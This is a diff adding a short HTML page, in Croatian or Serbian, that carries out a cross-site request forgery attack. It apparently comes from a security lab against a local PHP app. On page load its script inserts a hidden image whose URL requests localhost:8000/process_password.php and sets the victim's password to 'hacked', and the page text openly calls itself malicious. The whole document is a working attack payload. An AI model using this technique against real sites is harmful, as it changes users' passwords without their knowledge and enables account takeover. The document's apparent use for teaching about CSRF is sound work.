@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Maliciozna Stranica</title>
+    <script>
+        function csrfAttack() {
+            var img = document.createElement('img');
+            img.src = 'http://localhost:8000/process_password.php?new_password=hacked&confirm_password=hacked';
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        }
+        window.onload = csrfAttack;
+    </script>
+</head>
+<body>
+    <h2>Ovo je maliciozna stranica</h2>
+    <p>Ako je aplikacija ranjiva, lozinka će biti promijenjena bez vašeg znanja.</p>
+</body>
+</html>
